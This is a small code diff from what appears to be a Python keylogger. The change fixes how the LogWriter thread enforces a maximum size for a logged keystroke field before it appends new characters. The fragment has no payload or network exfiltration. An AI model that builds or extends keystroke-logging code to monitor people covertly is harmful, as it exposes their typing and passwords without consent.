@@ -212,7 +212,7 @@ class LogWriter(threading.Thread):
 				else:
 					eventlisttmp.append(unicode(self.ParseEventValue(event), 'latin-1'))
 					
-				if (self.eventlist[:6] == eventlisttmp[:6]) and (self.settings['General']['Limit Keylog Field Size'] == 0 or len(self.eventlist[-1]) < self.settings['General']['Limit Keylog Field Size']):
+				if (self.eventlist[:6] == eventlisttmp[:6]) and (self.settings['General']['Limit Keylog Field Size'] == 0 or (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
 					self.eventlist[-1] = str(self.eventlist[-1]) + str(eventlisttmp[-1]) #append char to log
 					if self.settings['General']['Log Key Count'] == True:
 						self.eventlist[-2] = str(int(self.eventlist[-2]) + 1) # increase stroke count
